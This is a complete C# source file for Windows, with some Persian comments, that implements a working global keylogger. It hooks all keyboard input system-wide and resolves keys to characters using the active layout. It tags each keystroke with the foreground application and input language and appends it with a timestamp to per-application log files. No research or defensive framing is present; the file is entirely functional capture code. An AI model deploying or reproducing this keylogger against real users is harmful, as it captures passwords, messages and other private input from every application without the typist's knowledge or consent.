using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class Program
{
    // ------------------------------
    // Constants
    // ------------------------------
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    // ------------------------------
    // WinAPI
    // ------------------------------
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags,
        IntPtr dwhkl);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    // ------------------------------
    // Main
    // ------------------------------
    static void Main()
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("Keyboard monitor running...");

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process p = Process.GetCurrentProcess())
        using (ProcessModule m = p.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(m.ModuleName), 0);
        }
    }

    // ------------------------------
    // Hook Callback
    // ------------------------------
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            string ch = VkToChar(vkCode);
            if (!string.IsNullOrEmpty(ch))
            {
                string app = GetActiveProcessName();
                string lang = GetKeyboardLanguage();
                Log(app, lang, ch);
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    // ------------------------------
    // VK → Real Character (SAFE)
    // ------------------------------
    private static string VkToChar(int vk)
    {
        byte[] state = new byte[256];

        // فقط کلیدهای مهم (بدون GetKeyboardState)
        if ((GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0)
            state[(int)Keys.ShiftKey] = 0x80;

        if ((GetAsyncKeyState((int)Keys.CapsLock) & 1) != 0)
            state[(int)Keys.CapsLock] = 0x01;

        uint scanCode = MapVirtualKey((uint)vk, 0);

        IntPtr hwnd = GetForegroundWindow();
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        IntPtr hkl = GetKeyboardLayout(threadId);

        StringBuilder sb = new StringBuilder(8);

        int result = ToUnicodeEx(
            (uint)vk,
            scanCode,
            state,
            sb,
            sb.Capacity,
            0,
            hkl);

        if (result > 0)
            return sb.ToString();

        // کلیدهای کنترلی
        if (vk == (int)Keys.Space) return " ";
        if (vk == (int)Keys.Enter) return "\n";

        return "";
    }

    // ------------------------------
    // Active App
    // ------------------------------
    private static string GetActiveProcessName()
    {
        IntPtr hwnd = GetForegroundWindow();
        GetWindowThreadProcessId(hwnd, out uint pid);
        return Process.GetProcessById((int)pid).ProcessName;
    }

    // ------------------------------
    // Keyboard Language
    // ------------------------------
    private static string GetKeyboardLanguage()
    {
        IntPtr hwnd = GetForegroundWindow();
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        IntPtr hkl = GetKeyboardLayout(threadId);
        int langId = hkl.ToInt32() & 0xFFFF;
        return new System.Globalization.CultureInfo(langId).Name;
    }

    // ------------------------------
    // Logging
    // ------------------------------
    private static void Log(string app, string lang, string ch)
    {
        Directory.CreateDirectory("Logs");
        File.AppendAllText(
            Path.Combine("Logs", app + ".txt"),
            $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} [{lang}] {ch}",
            Encoding.UTF8);
    }
}
